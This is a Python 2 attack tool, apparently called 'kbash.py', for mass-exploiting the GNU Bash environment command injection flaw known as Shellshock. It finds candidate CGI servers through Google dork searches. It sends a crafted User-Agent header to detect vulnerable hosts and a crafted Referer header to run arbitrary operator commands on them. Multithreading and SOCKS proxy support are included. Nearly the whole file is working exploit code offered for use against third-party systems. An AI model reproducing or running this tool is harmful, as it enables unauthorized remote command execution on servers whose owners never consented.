import urllib2, requests, socket, urlparse
import Queue, threading, re
import random, sys, argparse, time


class Exploit(threading.Thread):
	def __init__(self, google, cmd=None):
		self.targets = google.targets
		self.google = google
		self.cmd = cmd
		threading.Thread.__init__(self)

	def run(self):
		while not self.targets.empty(): 
			url = self.targets.get()
			try:
				if self.cmd is not None and len(self.cmd)>0:
					headers = {"Referer":'() { 1;}; echo "Content-type: text/plain"; echo; echo; '+self.cmd}
					r = requests.get(url, headers = headers, verify = False, timeout = 10)
					print "[ Reponse Code ] "+str(r.status_code)
					print "[ Response Header ]"
					print r.headers
					print r.content
				else:
					headers = {"User-Agent" : '() { 1;}; echo -e "header\x3akbash-scaned2"'}
					r = requests.get(url, headers = headers, verify = False, timeout = 10)
					#print r.headers
					if 'header' in r.headers and 'kbash-scaned' in r.headers['header']:
						print "[ FIND vulnerable ] " + url
					else:
						print "[ no vulnerable ] " + url[:50]
				#print headers
				
					#pass
				#print str(r.status_code) + " : " + url
			except Exception as e:
				print "[ ERROR ]" + str(e) + " " + url 
			finally:
				self.targets.task_done()

		#print "[ DEBUG ] " + self.getName() + " done"

class Payload(threading.Thread):
	def __init__(self, dork="", count=0, mode="google"):
		self.dork = dork
		self.mode = mode
		self.count = count
		self.targets = Queue.Queue()
		self.launch = False
		self.search_complete = False
		threading.Thread.__init__(self)

	def run(self):
		try:
			for i in range(0, self.count):
				self.google(dork, i)
				if not self.targets.empty():
					self.launch = True
				else:
					self.launch = False
				time.sleep(random.random()*3)
		except Exception as e:
			print "Cant Connect to Google!"
		finally:
			self.launch = True
			self.search_complete = True			
		print "Google Search Done"

	def google(self, dork, index):
		url = 'https://www.google.com/search?q='+urllib2.quote(dork)+'&_'+str(random.random())+'$cr=countryCN&start='+str(index);
		
		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
		#headers = {"User-Agent":userAgent}

		r = requests.get(url, timeout=10, verify = False)
		if r.status_code == 503:
			print "Blocked by Google!"

		p = re.compile("/url\\?q=(.*?)&")
		result = re.findall(p,r.content)

		for link in result:
			if "googleusercontent" not in link:
				#print link
				self.targets.put(link)



USAGE = "python kbash.py [-u single_target -d google_dork -t thread -c page_count -e command  -p proxy]"
DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 2.1 \n code by kingx  -   http://cih.so"
epilog = "License, requests, etc: https://github.com/KxCode"
parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
parser.add_argument('-u', dest='url',
                    help="specific a single Target Url")
parser.add_argument('-d', dest='dork',
                    help="Custom Google Dork,Using Google Search to find targets",
                    default="filetype:sh inurl:cgi")
parser.add_argument('-t', dest='thread_count',
					type=int,
                    help="thread count",
                    default=4)
parser.add_argument('-c', dest='page_count',
					type=int,
                    help="crawl google page count",
                    default=1)
parser.add_argument('-e', dest='cmd',
                    help="Command to Execute",
                    default="")
parser.add_argument('-p', dest='proxy',
                    help="proxy,support:socks4,socks5,http eg: socks5://127.0.0.1:1234 ")
args = parser.parse_args()


#PROXY CODE START
if args.proxy:
	try:
		proxy = urlparse.urlparse(args.proxy)
		(scheme,host,port) = (proxy.scheme,proxy.hostname,proxy.port)
		print "[ PROXY ]\t"+ scheme + "://" + host + ":" + str(port)
		try:
			import socks
		except ImportError:
		    print("For Proxy Support, Please Download socks.py From Sockipy Project.")
		    sys.exit(1)
		if proxy.scheme == "socks5":
			proxy_type = socks.PROXY_TYPE_SOCKS5
		elif proxy.scheme == "socks4":
			proxy_type = socks.PROXY_TYPE_SOCKS4
		elif proxy.scheme == "http":
			proxy_type = socks.PROXY_TYPE_HTTP
		else:
			print "Unsupported proxy type!"
			sys.exit(1)
		socks.setdefaultproxy(proxy_type, host, port)
		socket.socket = socks.socksocket
	except Exception as e:
		print e
#PROXY CODE END

print "[ THREAD ]\t"+str(args.thread_count)
print "[ PAGE ]\t"+str(args.page_count)

dork = args.dork


if "url" in args:
	print "[ ATTACK ] " + args.url
	print "[ Tips ] you should specific the absolute path for the command to execute"
	payload = Payload(mode="single")
	payload.targets.put(args.url)
	payload.launch = True
else:
	payload = Payload(dork, args.page_count)
	print "Using Google Search."
	print "[ DORK ]\t"+dork
	payload.start()

while not payload.launch:
	time.sleep(0.1)

pool = []
for i in range(0,args.thread_count):
	exp = Exploit(payload, args.cmd)
	pool.append(exp)
	exp.daemon = True
	exp.start()

for th in pool:
	th.join()

print "done"
